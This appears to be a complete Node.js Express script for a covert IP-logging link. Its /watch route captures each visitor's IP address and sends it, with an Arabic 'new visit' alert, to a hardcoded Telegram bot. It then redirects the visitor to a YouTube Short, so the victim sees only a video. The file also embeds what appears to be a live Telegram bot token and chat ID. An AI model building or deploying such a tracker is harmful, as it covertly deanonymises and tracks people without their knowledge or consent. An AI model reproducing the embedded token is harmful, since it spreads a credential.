const express = require('express');
const app = express();

const TELEGRAM_TOKEN = '8497652334:AAFF0E0w2b11XSzs48a6Nq3EbhObocc8hkU';
const CHAT_ID = '6630829302';

app.get('/watch', async (req, res) => {
    try {
        const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const message = `🎯 تم رصيد زيارة جديدة!\n🌐 الـ IP: ${visitorIp}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        await fetch(url);
    } catch (error) {
        console.log('Error sending to telegram:', error);
    }
    res.redirect('https://youtube.com/shorts/bN9h2oRnLB4?si=kXhF5Q_P-ER2yazA_ID');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
